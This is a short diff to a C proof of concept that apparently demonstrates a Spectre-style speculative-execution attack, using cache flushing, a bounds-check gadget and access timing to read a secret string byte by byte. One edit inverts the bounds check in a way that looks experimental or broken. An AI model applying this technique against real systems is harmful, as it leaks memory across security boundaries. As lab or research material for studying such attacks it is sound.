@@ -22,7 +22,7 @@ void do_speculative_execution(int index)
     _mm_clflush(array);
     for (volatile int z = 0; z < 100; z++);
     //printf("index: %d array: 0x%d\n",index,array[index]);
-    if (index < sizeof(array))
+    if (index > sizeof(array))//0-15, 72, 0-15, 72
     {
         mem_pages[array[index]][0] = 0;
     }
@@ -70,7 +70,7 @@ void detect_cached_page(int results[PAGE_NUM])
         //Order is lightly mixed up to prevent stride prediction
         int mixed_i = ((i * 167) + 13) & 255;
         int access_time = get_access_time(mem_pages[mixed_i]);
-        printf("access_time: %d i: %d\n",access_time,mixed_i);
+        //printf("access_time: %d i: %d\n",access_time,mixed_i);
         if (min_time > access_time)
         {
             min_time = access_time;
@@ -132,7 +132,7 @@ uint8_t probe(uint8_t* target)
     return get_best_result(results);
 }
 
-char *secret = "Hello";//char pointer
+char *secret = "HAHAHA HAHAHA HAHAHA HAHAHA HAHAHA HAHAHA HAHAHA HAHAHA";//char pointer
 
 int main()
 {
@@ -147,7 +147,7 @@ int main()
 
     printf("secret = ");//sleep(1);
     
-    for(int i = 0; i < 1; i++)
+    for(int i = 0; i < len; i++)
     {
         printf("%c", probe((uint8_t*)&secret[i]));//send the address of the array to probe
     }
